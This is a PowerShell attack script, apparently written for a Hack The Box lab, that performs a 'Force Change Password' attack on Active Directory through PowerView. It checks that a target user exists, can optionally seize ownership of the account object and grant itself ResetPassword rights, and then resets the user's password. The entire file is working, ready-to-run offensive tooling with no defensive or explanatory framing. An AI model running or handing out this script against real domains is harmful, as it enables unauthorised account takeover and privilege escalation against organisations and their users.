<#
.SYNOPSIS
    Force Change Password (FCP) Attack using PowerView's Set-DomainUserPassword.

.DESCRIPTION
    This script changes the password of a target domain user account by leveraging delegated rights or misconfigurations.
    Requires PowerView to be loaded in the current session.

.PARAMETER TargetIdentity
    The sAMAccountName of the target user whose password will be changed.

.EXAMPLE
    .\Invoke-FCP.ps1 -TargetIdentity "andy"

.NOTES
    - PowerView.ps1 must already be loaded.
    - You will be prompted for the new password to set.
    - You will be prompted for credentials if you're not running as the necessary user.
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetIdentity,
    
    [Switch]$TakeOwnership,
    
    [Switch]$AddResetAcl,
    
    [Switch]$Help,

    [Parameter(Mandatory = $false)]
    [string]$NewPassword
)

if ($Help) {
    Write-Host @"
Force Change Password (FCP) Attack using PowerView

SYNTAX:
    .\Invoke-FCP.ps1 -TargetIdentity <username> [-NewPassword <string>] [-TakeOwnership] [-AddResetAcl]

PARAMETERS:
    -TargetIdentity   (Required)  The sAMAccountName of the domain user to target.
    -NewPassword      (Optional)  Provide the new password directly as plain text.
    -TakeOwnership    (Optional)  Take ownership of the target object using Set-DomainObjectOwner.
    -AddResetAcl      (Optional)  Grant yourself ResetPassword rights on the target using Add-DomainObjectAcl.
    -Help             (Optional)  Show this help message.

EXAMPLES:
    .\Invoke-FCP.ps1 -TargetIdentity "svc-app"
    .\Invoke-FCP.ps1 -TargetIdentity "ca_svc" -NewPassword "Winter2024!" -TakeOwnership -AddResetAcl

NOTES:
    - PowerView.ps1 must be in the same directory or imported.
    - You must have rights to take ownership or modify ACLs for those options to succeed.
"@ -ForegroundColor Cyan
    return
}


# Validate TargetIdentity input
if ([string]::IsNullOrWhiteSpace($TargetIdentity)) {
    Write-Error "The TargetIdentity parameter is null or empty. Provide a valid sAMAccountName."
    return
}

# Import PowerView.ps1 if needed
if (-not (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue)) {
    $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
    $PowerViewPath = Join-Path $ScriptDir 'PowerView.ps1'

    if (Test-Path $PowerViewPath) {
        Write-Host "[*] Importing PowerView from: $PowerViewPath" -ForegroundColor Cyan
        try {
            . $PowerViewPath
            Write-Host "[+] Successfully imported PowerView.ps1" -ForegroundColor Green
        } catch {
            Write-Error "Failed to import PowerView.ps1: $_"
            return
        }
    }
}

# Check if Set-DomainUserPassword is available (PowerView loaded)
if (-not (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue)) {
    Write-Error "PowerView's Set-DomainUserPassword function is not loaded. Import PowerView.ps1 before running this script."
    return
}

# Check if the user exists in the domain
Write-Host "[*] Verifying if user '$TargetIdentity' exists in the domain..." -ForegroundColor Cyan
$TargetUser = Get-DomainUser -Identity $TargetIdentity -ErrorAction SilentlyContinue

if (-not $TargetUser) {
    Write-Error "User '$TargetIdentity' not found in the domain. Check the username and try again."
    return
}
else
{
    Write-Host "[+] '$TargetIdentity' exists in the domain!" -ForegroundColor Cyan
}

# Handle NewPassword parameter or prompt interactively
if ($NewPassword) {
    $UserPassword_sec = ConvertTo-SecureString $NewPassword -AsPlainText -Force
    Write-Host "[*] Using provided password for target user '$TargetIdentity'." -ForegroundColor Yellow
} else {
    Write-Host "[*] Requesting new password interactively..." -ForegroundColor Cyan
    $UserPassword_sec = Read-Host "Enter the NEW password for '$TargetIdentity'" -AsSecureString
}

# Prompt for credentials
#Write-Host "`nEnter credentials with permissions to change the password (e.g., RYAN@SEQUEL.HTB):"
#$Cred = Get-Credential

# Optional: Take Ownership and Add ResetPassword ACL
if ($TakeOwnership) {
    Write-Host "[*] Taking ownership of '$TargetIdentity'..." -ForegroundColor Yellow
    try {
        Set-DomainObjectOwner -Identity $TargetIdentity -OwnerIdentity $env:USERNAME -Verbose
        Write-Host "[+] Ownership of '$TargetIdentity' assigned to '$env:USERNAME'" -ForegroundColor Green
    } catch {
        Write-Error "[-] Failed to take ownership: "
        Write-Error "$_"
        return
    }
}

if ($AddResetAcl) {
    Write-Host "[*] Adding 'ResetPassword' rights on '$TargetIdentity' for '$env:USERNAME'..." -ForegroundColor Yellow
    try {
        Add-DomainObjectAcl -TargetIdentity $TargetIdentity -Rights ResetPassword -PrincipalIdentity $env:USERNAME -Verbose
        Write-Host "[+] 'ResetPassword' rights assigned to '$env:USERNAME'" -ForegroundColor Green
    } catch {
        Write-Error "[-] Failed to add ACL:"
        Write-Error "$_"
        return
    }
}

# Attempt to change password
try {
    #Set-DomainUserPassword -Identity $TargetIdentity -AccountPassword $UserPassword_sec -Credential $Cred -Verbose
    Set-DomainUserPassword -Identity $TargetIdentity -AccountPassword $UserPassword_sec -Verbose
    Write-Host "`n[+] Successfully changed password for user: $TargetIdentity" -ForegroundColor Green
} catch {
    Write-Error "`n[-] Failed to change password for user: $TargetIdentity. $_"
}
